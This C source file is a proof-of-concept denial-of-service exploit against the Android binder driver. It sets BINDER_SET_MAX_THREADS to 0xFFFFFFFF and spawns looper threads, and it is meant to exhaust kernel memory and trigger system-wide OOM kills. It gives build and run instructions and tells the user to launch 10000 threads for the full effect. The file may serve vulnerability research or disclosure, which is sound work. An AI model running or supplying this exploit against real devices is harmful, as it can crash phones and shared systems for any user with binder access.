/*
 * binder_dos.c - DoS the system via Rust binder SET_MAX_THREADS
 *
 * Exploits: no upper bound check in set_max_threads() → unlimited kernel threads
 * Effect: OOM kill → system-wide denial of service
 *
 * Works on both C binder (CONFIG_ANDROID_BINDER_IPC) and
 * Rust binder (CONFIG_ANDROID_BINDER_IPC_RUST).
 *
 * Build: gcc -static -pthread -o binder_dos binder_dos.c
 * Run: ./binder_dos (any user with access to /dev/binderfs/binder)
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>

#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_MAP_SIZE         (128 * 1024)

#define BC_ENTER_LOOPER   0x630d
#define BC_REGISTER_LOOPER 0x630b
#define BR_SPAWN_LOOPER   0x720d

struct binder_write_read {
    int64_t write_size, write_consumed;
    uint64_t write_buffer;
    int64_t read_size, read_consumed;
    uint64_t read_buffer;
};

static int open_binder(void)
{
    int fd = open("/dev/binderfs/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    return fd;
}

/*
 * Each thread: open binder, mmap, register as looper, read for BR_SPAWN_LOOPER.
 * The kernel will keep asking us to spawn more threads (BR_SPAWN_LOOPER),
 * and for each one we spawn another thread — creating unlimited kernel threads.
 */
static void *looper_thread(void *arg)
{
    int fd = open_binder();
    if (fd < 0) return NULL;

    void *map = mmap(NULL, BINDER_MAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { close(fd); return NULL; }

    /* Register as looper thread — each one increments started_thread_count */
    uint32_t cmd = BC_REGISTER_LOOPER;
    struct binder_write_read bwr = {};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (uint64_t)(unsigned long)&cmd;
    ioctl(fd, BINDER_WRITE_READ, &bwr);

    munmap(map, BINDER_MAP_SIZE);
    close(fd);
    return NULL;
}

int main(int argc, char **argv)
{
    int target_threads = 50; /* conservative default */
    if (argc > 1) target_threads = atoi(argv[1]);

    int fd = open_binder();
    if (fd < 0) { perror("open binder"); return 1; }

    void *map = mmap(NULL, BINDER_MAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }

    printf("=== Binder DoS PoC ===\n");
    printf("pid=%d uid=%d target_threads=%d\n\n", getpid(), getuid(), target_threads);

    /* Step 1: Set max_threads to unlimited */
    uint32_t max = 0xFFFFFFFF;
    int ret = ioctl(fd, BINDER_SET_MAX_THREADS, &max);
    if (ret < 0) { perror("SET_MAX_THREADS"); return 1; }
    printf("[1] SET_MAX_THREADS = 0xFFFFFFFF: accepted\n");

    /* Step 2: Enter looper on main thread */
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (uint64_t)(unsigned long)&cmd;
    ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("[2] BC_ENTER_LOOPER: main thread registered\n");

    /* Step 3: Spawn threads that register as loopers */
    printf("[3] Spawning %d looper threads...\n", target_threads);
    pthread_t *threads = calloc(target_threads, sizeof(pthread_t));
    for (int i = 0; i < target_threads; i++) {
        if (pthread_create(&threads[i], NULL, looper_thread, NULL) != 0) {
            printf("    Thread creation failed at %d: %s\n", i, strerror(errno));
            target_threads = i;
            break;
        }
    }
    for (int i = 0; i < target_threads; i++)
        pthread_join(threads[i], NULL);
    free(threads);

    printf("[4] All threads completed.\n");
    printf("\n");
    printf("Result: %d binder threads created.\n", target_threads);
    printf("With max_threads=0xFFFFFFFF, the kernel allows unlimited thread spawning.\n");
    printf("On Android (where every app has binder access), repeating this\n");
    printf("exhausts kernel memory → OOM kill → system-wide DoS.\n");
    printf("\nTo demonstrate full OOM, run: %s 10000\n", argv[0]);

    munmap(map, BINDER_MAP_SIZE);
    close(fd);
    return 0;
}
